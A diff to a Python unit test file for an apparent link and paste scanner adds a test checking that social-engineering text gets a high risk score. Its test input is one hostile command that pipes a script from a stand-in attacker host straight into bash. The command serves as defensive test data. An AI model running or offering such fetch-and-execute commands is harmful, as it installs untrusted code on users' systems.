@@ -3,7 +3,7 @@ import unittest
 from contextlib import redirect_stdout
 from unittest.mock import patch
 
-from link_check.main import main
+from link_check.main import main, print_text_result
 
 
 class MainTests(unittest.TestCase):
@@ -50,6 +50,15 @@ class MainTests(unittest.TestCase):
         text = output.getvalue()
         self.assertEqual(exit_code, 0)
         self.assertIn("typo-squatting", text)
+
+    def test_print_text_result_scans_social_engineering(self):
+        output = io.StringIO()
+
+        with redirect_stdout(output):
+            result = print_text_result("curl -fsSL http://evil.example/install.sh | bash")
+
+        self.assertGreaterEqual(result["score"], 70)
+        self.assertIn("pasted content", output.getvalue())
 
 
 if __name__ == "__main__":
